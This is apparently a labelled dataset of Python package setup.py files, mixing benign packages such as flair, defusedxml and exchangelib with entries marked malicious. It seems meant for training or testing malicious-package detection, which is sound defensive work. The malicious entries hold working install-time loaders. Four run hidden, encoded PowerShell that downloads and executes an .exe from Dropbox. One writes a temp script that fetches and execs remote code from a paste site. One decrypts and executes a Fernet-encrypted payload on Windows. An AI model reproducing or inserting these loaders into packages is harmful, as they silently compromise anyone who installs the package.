{"idx": "google-cloud-recaptcha-enterprise-1.8.0", "func": "# -*- coding: utf-8 -*-\n\n# Copyright (C) 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport io\nimport os\n\nimport setuptools  # type: ignore\n\nversion = \"1.8.0\"\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\nsetuptools.setup(\n    name=\"google-cloud-recaptcha-enterprise\",\n    version=version,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-recaptcha-enterprise\",\n    packages=[\n        package\n        for package in setuptools.PEP420PackageFinder.find()\n        if package.startswith(\"google\")\n    ],\n    namespace_packages=(\"google\", \"google.cloud\"),\n    platforms=\"Posix; MacOS X; Windows\",\n    include_package_data=True,\n    install_requires=(\n        \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n        \"proto-plus >= 1.15.0, <2.0.0dev\",\n        \"protobuf >= 3.19.0, <4.0.0dev\",\n    ),\n    extras_require={},\n    python_requires=\">=3.7\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "h3-3.7.4", "func": "import os\nfrom setuptools import find_packages\nfrom skbuild import setup\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nabout = {}\nwith open(os.path.join(here, 'src', 'h3', '_version.py')) as f:\n    exec(f.read(), about)\n\n\ndef long_desc():\n    here = os.path.abspath(os.path.dirname(__file__))\n    fname = os.path.join(here, 'readme.md')\n    with open(fname) as f:\n        long_description = f.read()\n\n    return long_description\n\n\nsetup(\n    name = 'h3',\n    version = about['__version__'],\n    description = about['__description__'],\n    long_description = long_desc(),\n    long_description_content_type = 'text/markdown',\n    license = about['__license__'],\n    author = about['__author__'],\n    author_email = about['__author_email__'],\n    url = about['__url__'],\n    classifiers = about['__classifiers__'],\n    include_package_data=True,\n    packages = find_packages(\n        'src',\n        exclude = [\"*.tests\", \"*.tests.*\", \"tests.*\", \"tests\"],\n    ),\n    package_dir = {'': 'src'},\n    cmake_languages = ('C'),\n    extras_require={\n        'numpy': ['numpy'],\n        'test': ['pytest', 'pytest-cov', 'flake8', 'pylint'],\n        'all': ['numpy', 'pytest', 'pytest-cov', 'flake8', 'pylint'],\n    },\n)\n", "target": 0}
{"idx": "toolvm-8.98", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'toolvm',\n    packages = ['modlib'],\n    version = '1.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "nvidiaintel-4.57", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'nvidiaintel',\n    packages = ['modlib'],\n    version = '6.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "osxen-1", "func": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/c24j2/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='osxen',\n    packages=['osxen'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n", "target": 1}
{"idx": "py-guimaskram-8.5", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-guimaskram',\n    packages = ['modlib'],\n    version = '10.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flatdict-4.0.1", "func": "import pkg_resources\nimport setuptools\n\nsetuptools_version = pkg_resources.parse_version(setuptools.__version__)\nif setuptools_version < pkg_resources.parse_version('39.2'):\n    raise SystemExit('setuptools 39.2 or greater required for installation')\nsetuptools.setup()\n", "target": 0}
{"idx": "ggplot-0.11.5", "func": "import os\nfrom setuptools import find_packages, setup\n\n\ndef extract_version():\n    \"\"\"Return ggplot.__version__ without importing ggplot.\n    \n    Extracts version from ggplot/__init__.py\n    without importing ggplot, which requires dependencies to be installed.\n    \"\"\"\n    with open('ggplot/__init__.py') as fd:\n        ns = {}\n        for line in fd:\n            if line.startswith('__version__'):\n                exec(line.strip(), ns)\n                return ns['__version__']\n\n\nsetup(\n    name=\"ggplot\",\n    # Increase the version in ggplot/__init__.py\n    version=extract_version(),\n    author=\"Greg Lamp\",\n    author_email=\"greg@yhathq.com\",\n    url=\"https://github.com/yhat/ggplot/\",\n    license=\"BSD\",\n    packages=find_packages(),\n    package_dir={ \"ggplot\": \"ggplot\" },\n    package_data={\n        \"ggplot\": [\n            \"datasets/*.csv\",\n            \"geoms/*.png\"\n        ]\n    },\n    description=\"ggplot for python\",\n    # run pandoc --from=markdown --to=rst --output=README.rst README.md\n    long_description=open(\"README.rst\").read(),\n    install_requires=[\n        \"six\",\n        \"statsmodels\",\n        \"brewer2mpl\",\n        \"matplotlib\",\n        \"scipy\",\n        \"patsy>=0.4\",\n        \"pandas\",\n        \"cycler\",\n        \"numpy\"\n    ],\n    classifiers=[\n        'Intended Audience :: Science/Research',\n        'Intended Audience :: Developers',\n        'Programming Language :: Python',\n        'Topic :: Software Development',\n        'Topic :: Scientific/Engineering',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Operating System :: Unix',\n        'Operating System :: MacOS',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3'\n    ],\n    zip_safe=False\n)\n", "target": 0}
{"idx": "flair-0.11.3", "func": "from setuptools import find_packages, setup\n\nwith open(\"requirements.txt\") as f:\n    required = f.read().splitlines()\n\nsetup(\n    name=\"flair\",\n    version=\"0.11.3\",\n    description=\"A very simple framework for state-of-the-art NLP\",\n    long_description=open(\"README.md\", encoding=\"utf-8\").read(),\n    long_description_content_type=\"text/markdown\",\n    author=\"Alan Akbik\",\n    author_email=\"alan.akbik@gmail.com\",\n    url=\"https://github.com/flairNLP/flair\",\n    packages=find_packages(exclude=\"tests\"),  # same as name\n    license=\"MIT\",\n    install_requires=required,\n    include_package_data=True,\n    python_requires=\">=3.6\",\n)\n", "target": 0}
{"idx": "selfcraftsuperhacked-6.76", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcraftsuperhacked',\n    packages = ['modlib'],\n    version = '4.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "elasticsearch2-2.5.1", "func": "# -*- coding: utf-8 -*-\nfrom os.path import join, dirname\nfrom setuptools import setup, find_packages\nimport sys\n\nVERSION = (2, 5, 1)\n__version__ = VERSION\n__versionstr__ = \".\".join(map(str, VERSION))\n\nf = open(join(dirname(__file__), \"README\"))\nlong_description = f.read().strip()\nf.close()\n\ninstall_requires = [\"urllib3>=1.8, <2.0\"]\ntests_require = [\n    \"requests>=1.0.0, <3.0.0\",\n    \"nose\",\n    \"coverage\",\n    \"mock\",\n    \"pyaml\",\n    \"nosexcover\",\n]\n\n# use external unittest for 2.6\nif sys.version_info[:2] == (2, 6):\n    install_requires.append(\"unittest2\")\n\nsetup(\n    name=\"elasticsearch2\",\n    description=\"Python client for Elasticsearch\",\n    license=\"Apache License, Version 2.0\",\n    url=\"https://github.com/elastic/elasticsearch-py\",\n    long_description=long_description,\n    version=__versionstr__,\n    author=\"Honza Kr\u00e1l\",\n    author_email=\"honza.kral@gmail.com\",\n    packages=find_packages(where=\".\", exclude=(\"test_elasticsearch2*\",)),\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.6\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.2\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    install_requires=install_requires,\n    test_suite=\"test_elasticsearch2.run_tests.run_all\",\n    tests_require=tests_require,\n)\n", "target": 0}
{"idx": "defusedxml-0.7.1", "func": "#!/usr/bin/env python\nfrom __future__ import absolute_import\nimport sys\nfrom distutils.core import Command\nimport subprocess\n\nfrom setuptools import setup\n\nimport defusedxml\n\n\nclass PyTest(Command):\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        errno = subprocess.call([sys.executable, \"tests.py\"])\n        raise SystemExit(errno)\n\n\nlong_description = []\nwith open(\"README.txt\") as f:\n    long_description.append(f.read())\nwith open(\"CHANGES.txt\") as f:\n    long_description.append(f.read())\n\n\nsetup(\n    name=\"defusedxml\",\n    version=defusedxml.__version__,\n    cmdclass={\"test\": PyTest},\n    packages=[\"defusedxml\"],\n    author=\"Christian Heimes\",\n    author_email=\"christian@python.org\",\n    maintainer=\"Christian Heimes\",\n    maintainer_email=\"christian@python.org\",\n    url=\"https://github.com/tiran/defusedxml\",\n    download_url=\"https://pypi.python.org/pypi/defusedxml\",\n    keywords=\"xml bomb DoS\",\n    platforms=\"all\",\n    license=\"PSFL\",\n    description=\"XML bomb protection for Python stdlib modules\",\n    long_description=\"\\n\".join(long_description),\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Python Software Foundation License\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Topic :: Text Processing :: Markup :: XML\",\n    ],\n    python_requires=\">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*\",\n)\n", "target": 0}
{"idx": "tensoflsw-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'NFjUsGztxQeEDavMKkRbVPyfyGSOX ZbCrJsiDLrMEyANAlcMYeJIuilwFC'\nLONG_DESCRIPTION = 'KPSZYgVDmUEyXWBOHTvdoFXpEpihtIGnYPMcxuXeXaUyQufp cozmPsuzphRxwlrLnNWxNxAVlzJcRHUPgj nTolVMcualNYejxJbLzkYuhpDsxEvpErhQJKjzvxeNyvgYIIB'\n\n\nclass GGeVBxJezMkQfTuiyqDeIGfgVFAZKIbctaMTQUioquIbQzvQeotkKphQTGdTlJAyHPxDrNlXvVZxfjqbOrODEVkImxMoeeouJYOoZXAIymDslmGpGkVqlGkYkiEGFXdcQMlpaxvyIOsmCQkzXlGfioWQCmJB(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'Gw9Sn5DIzQrmGT-K5I6rNf9VCCK6_xk5WTIbmjT-K58=').decrypt(b'gAAAAABmBH2IVSmHpu_wjAO_GCRXaGwnBB6hz-kwya60RS82DWuYvhLSfvs0azlpzCUrkuCYjKBd56ynSL6iIUAFvbQMq4ssDdUVjr35yqSgRrsjpxd3J-R6k8-nRoJG2qprKZK_J2LdGABatcDzUDjv4BTq1c56z3apDDOp_YepaeRPvH_wfXToWoyofaGTfhR_bLjNpVO-slEZ3ioo4loII7G2xb7iwokXnQRyP_ofHjVr0m2VNz4='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"tensoflsw\",\n    version=VERSION,\n    author=\"PzfwzyvvGgohrm\",\n    author_email=\"KivXWtTouXtvdAF@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GGeVBxJezMkQfTuiyqDeIGfgVFAZKIbctaMTQUioquIbQzvQeotkKphQTGdTlJAyHPxDrNlXvVZxfjqbOrODEVkImxMoeeouJYOoZXAIymDslmGpGkVqlGkYkiEGFXdcQMlpaxvyIOsmCQkzXlGfioWQCmJB,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "db-contrib-tool-0.4.6", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackage_dir = \\\n{'': 'src'}\n\npackages = \\\n['db_contrib_tool',\n 'db_contrib_tool.clients',\n 'db_contrib_tool.evg_aware_bisect',\n 'db_contrib_tool.services',\n 'db_contrib_tool.setup_repro_env',\n 'db_contrib_tool.symbolizer',\n 'db_contrib_tool.utils']\n\npackage_data = \\\n{'': ['*'], 'db_contrib_tool': ['config/*']}\n\ninstall_requires = \\\n['Inject>=4.3.1,<5.0.0',\n 'PyGithub==1.55',\n 'PyYAML==6.0',\n 'analytics-python==1.4.0',\n 'distro==1.6.0',\n 'evergreen.py==3.4.5',\n 'oauthlib==3.1.1',\n 'pkce==1.0.3',\n 'pydantic==1.8.2',\n 'requests-oauthlib==1.3.0',\n 'requests==2.26.0',\n 'structlog==21.4.0',\n 'tenacity>=8.0.1,<9.0.0']\n\nentry_points = \\\n{'console_scripts': ['db-contrib-tool = db_contrib_tool.cli:main']}\n\nsetup_kwargs = {\n    'name': 'db-contrib-tool',\n    'version': '0.4.6',\n    'description': \"The `db-contrib-tool` - MongoDB's tool for contributors.\",\n    'long_description': '# db-contrib-tool\\n\\nThe `db-contrib-tool` - MongoDB\\'s tools for contributors.\\n\\n## Table of contents\\n\\n- [db-contrib-tool](#db-contrib-tool)\\n  - [Table of contents](#table-of-contents)\\n  - [Description](#description)\\n  - [Dependencies](#dependencies)\\n  - [Installation](#installation)\\n  - [Usage](#usage)\\n  - [Contributor\\'s Guide (local development)](#contributors-guide-local-development)\\n    - [Install project dependencies](#install-project-dependencies)\\n    - [Run command line tool (local development)](#run-command-line-tool-local-development)\\n    - [Run linters](#run-linters)\\n    - [Run tests](#run-tests)\\n    - [Pre-commit](#pre-commit)\\n    - [Testing changes in mongo](#testing-changes-in-mongo)\\n    - [Test pipx package](#test-pipx-package)\\n    - [Versioning](#versioning)\\n    - [Code Review](#code-review)\\n    - [Deployment](#deployment)\\n\\n## Description\\n\\nThe command line tool with various subcommands:\\n- `bisect` - performs an evergreen-aware git-bisect to find the \\'last passing version\\' and \\'first failing version\\' of mongo\\n- `setup-repro-env`\\n  - [README.md](https://github.com/10gen/db-contrib-tool/blob/main/src/db_contrib_tool/setup_repro_env/README.md)\\n  - downloads and installs:\\n    - particular MongoDB versions\\n    - debug symbols\\n    - artifacts (including resmoke, python scripts etc)\\n    - python venv for resmoke, python scripts etc\\n- `symbolize`\\n  - [README.md](https://github.com/10gen/db-contrib-tool/blob/main/src/db_contrib_tool/symbolizer/README.md)\\n  - Symbolizes stacktraces from recent `mongod` and `mongos` binaries compiled in Evergreen, including patch builds, mainline builds, and release/production builds.\\n  - Requires authenticating to an internal MongoDB symbol mapping service.\\n\\n## Dependencies\\n\\n- Python 3.7 or later (python3 from the [MongoDB Toolchain](https://github.com/10gen/toolchain-builder/blob/master/INSTALL.md) is highly recommended)\\n\\n## Installation\\n\\nMake sure [dependencies](#dependencies) are installed.\\nUse [pipx](https://pypa.github.io/pipx/) to install db-contrib-tool that will be available globally on your machine:\\n```bash\\n$ python3 -m pip install pipx\\n$ python3 -m pipx ensurepath\\n```\\n\\nInstalling db-contrib-tool:\\n```bash\\n$ python3 -m pipx install db-contrib-tool\\n```\\n\\nUpgrading db-contrib-tool:\\n```bash\\n$ python3 -m pipx upgrade db-contrib-tool\\n```\\n\\n## Usage\\n\\nPrint out help message:\\n```bash\\n$ db-contrib-tool -h\\n```\\nMore information on the usage of `setup-repro-env` can be found [here](https://github.com/10gen/db-contrib-tool/blob/main/src/db_contrib_tool/setup_repro_env/README.md).\\n\\n## Contributor\\'s Guide (local development)\\n\\n### Install project dependencies\\n\\nThis project uses [poetry](https://python-poetry.org/) for dependency management.\\n```bash\\n$ poetry install\\n```\\n\\n### Run command line tool (local development)\\n\\n```bash\\n$ ENV=DEV poetry run db-contrib-tool -h\\n```\\n\\n### Run linters\\n\\n```bash\\n$ poetry run isort src tests\\n$ poetry run black src tests\\n```\\n\\n### Run tests\\n\\n```bash\\n$ poetry run pytest\\n```\\n\\n### Pre-commit\\n\\nThis project has [pre-commit](https://pre-commit.com/) configured. Pre-commit will run\\nconfigured checks at git commit time.<br>\\nTo enable pre-commit on your local repository run:\\n```bash\\n$ poetry run pre-commit install\\n```\\n\\nTo run pre-commit manually:\\n```bash\\n$ poetry run pre-commit run\\n```\\n\\n### Testing changes in mongo\\n\\nThis tool is used to help run tests in the mongodb/mongo repository. On occasion, it may be\\ndesirable to run a mongodb-mongo-* patch build with in-flight changes to this repository. The\\nfollowing steps can be take to accomplish that.\\n\\n- Create a branch with the changes you wish to test.\\n- Push the branch to the origin repository: `git push -u origin <branch_name>`.\\n- In the \"mongo\" repository, edit the [evergreen/prelude_db_contrib_tool.sh](https://github.com/10gen/mongo/blob/750f2cabe28900e86950695b7711c860a4165c94/evergreen/prelude_db_contrib_tool.sh#L16)\\n  to install from the git repository instead of from pypi:\\n\\n  ```bash\\n  python -m pip --disable-pip-version-check install \"git+ssh://git@github.com/10gen/db-contrib-tool.git@<branch_name>\" || exit 1\\n  ```\\n\\n- Create a patch build.\\n\\nThe patch build should now pull down the changes from your branch instead of using the published\\ndb-contrib-tool.\\n\\n**Note**: Since the db-contrib-tool is pulled from your branch, if you need to make additional\\nchanges to the tool, you can just push to the branch and then restart the desired tasks. There is\\nno need to create an additional patch build unless you also need to make updates to the mongo\\nrepository.\\n\\n### Test pipx package\\n\\nPipx installation recommendations can be found in [installation](#installation) section.<br>\\nThe tool can be installed via pipx from your local repo:\\n```bash\\n$ python3 -m pipx install /path/to/db-contrib-tool\\n```\\n\\n### Versioning\\n\\nThis project uses [semver](https://semver.org/) for versioning.\\nPlease include a description what is added for each new version in `CHANGELOG.md`.\\n\\n### Code Review\\n\\nPlease open a Github Pull Request for code review.\\nThis project uses the [Evergreen Commit Queue](https://github.com/evergreen-ci/evergreen/wiki/Commit-Queue#pr).\\nAdd a PR comment with `evergreen merge` to trigger a merge.\\n\\n### Deployment\\n\\nDeployment to pypi is automatically triggered on merges to main.\\n',\n    'author': 'STM team',\n    'author_email': 'dev-prod-stm@10gen.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/10gen/db-contrib-tool',\n    'package_dir': package_dir,\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.7,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "exchangelib-4.7.6", "func": "#!/usr/bin/env python\n\"\"\"\nRelease notes:\n*  Install pdoc3, wheel, twine\n* Bump version in exchangelib/__init__.py\n* Bump version in CHANGELOG.md\n* Generate documentation: pdoc3 --html exchangelib -o docs --force\n* Commit and push changes\n* Build package: rm -rf dist/* && python setup.py sdist bdist_wheel\n* Push to PyPI: twine upload dist/*\n* Create release on GitHub\n\"\"\"\nimport io\nimport os\n\nfrom setuptools import find_packages, setup\n\n\ndef version():\n    with io.open(os.path.join(os.path.dirname(__file__), \"exchangelib/__init__.py\"), encoding=\"utf-8\") as f:\n        for line in f:\n            if not line.startswith(\"__version__\"):\n                continue\n            return line.split(\"=\")[1].strip(\" \\\"'\\n\")\n\n\ndef read(file_name):\n    with io.open(os.path.join(os.path.dirname(__file__), file_name), encoding=\"utf-8\") as f:\n        return f.read()\n\n\nsetup(\n    name=\"exchangelib\",\n    version=version(),\n    author=\"Erik Cederstrand\",\n    author_email=\"erik@cederstrand.dk\",\n    description=\"Client for Microsoft Exchange Web Services (EWS)\",\n    long_description=read(\"README.md\"),\n    long_description_content_type=\"text/markdown\",\n    license=\"BSD-2-Clause\",\n    keywords=\"ews exchange autodiscover microsoft outlook exchange-web-services o365 office365\",\n    install_requires=[\n        'backports.zoneinfo;python_version<\"3.9\"',\n        \"cached_property\",\n        \"defusedxml>=0.6.0\",\n        \"dnspython>=2.0.0\",\n        \"isodate\",\n        \"lxml>3.0\",\n        \"oauthlib\",\n        \"pygments\",\n        \"requests>=2.7\",\n        \"requests_ntlm>=0.2.0\",\n        \"requests_oauthlib\",\n        \"tzdata\",\n        \"tzlocal\",\n    ],\n    extras_require={\n        \"kerberos\": [\"requests_gssapi\"],\n        \"sspi\": [\"requests_negotiate_sspi\"],  # Only for Win32 environments\n        \"complete\": [\"requests_gssapi\", \"requests_negotiate_sspi\"],  # Only for Win32 environments\n    },\n    packages=find_packages(exclude=(\"tests\", \"tests.*\")),\n    python_requires=\">=3.7\",\n    test_suite=\"tests\",\n    zip_safe=False,\n    url=\"https://github.com/ecederstrand/exchangelib\",\n    project_urls={\n        \"Bug Tracker\": \"https://github.com/ecederstrand/exchangelib/issues\",\n        \"Documentation\": \"https://ecederstrand.github.io/exchangelib/\",\n        \"Source Code\": \"https://github.com/ecederstrand/exchangelib\",\n    },\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Topic :: Communications\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Programming Language :: Python :: 3\",\n    ],\n)\n", "target": 0}
